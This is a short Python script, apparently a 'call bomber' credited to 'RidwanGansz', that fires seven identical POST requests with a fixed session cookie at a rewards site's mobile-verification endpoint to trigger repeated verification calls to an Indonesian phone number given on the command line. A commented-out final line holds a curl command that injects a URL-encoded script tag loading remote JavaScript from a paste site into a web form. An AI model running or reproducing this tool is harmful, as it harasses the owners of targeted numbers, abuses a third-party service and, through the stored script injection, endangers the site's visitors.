import os,sys,requests,json
from requests import post
sesid = sys.argv[1]
Fakhri = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
item = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
biru = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
kuning = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
ijo = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
ping = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
merah = requests.post(f"https://id.jagreward.com/member/verify-mobile/{sesid}/", data={"method": "CALL", "countryCode": "id",}, headers={"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",}).text
Fakhristat = Fakhri.split('"result":')[1];
Fakhristatus = Fakhristat.split(',')[0];
bjer = Fakhri.split('"message":"')[1];
mes = bjer.split('"')[0];
if Fakhristatus == "1":
     print ("*Tools By RidwanGansz*")
     print (f"*✔* *Calling* *+62{sesid}* *Success* :)")
     print (f"*Message:* {mes}")
else:
     print ("*Tools By RidwanGansz*")
     print (f"*✘* *Calling* *+62{sesid}* *gagal* :(")
     print (f"*Message:* {mes}")
     #os.system(f"curl --url {tar} --data 'nama=admin&email=admin%40gmail.com&pesan=%3Cscript+type%3D%22text%2Fjavascript%22+src%3D%22https%3A%2F%2Fhastebin.com%2Fraw%2Fudoxideleh%22%3E%3C%2Fscript%3E&submit=Kirim+Pesan'")
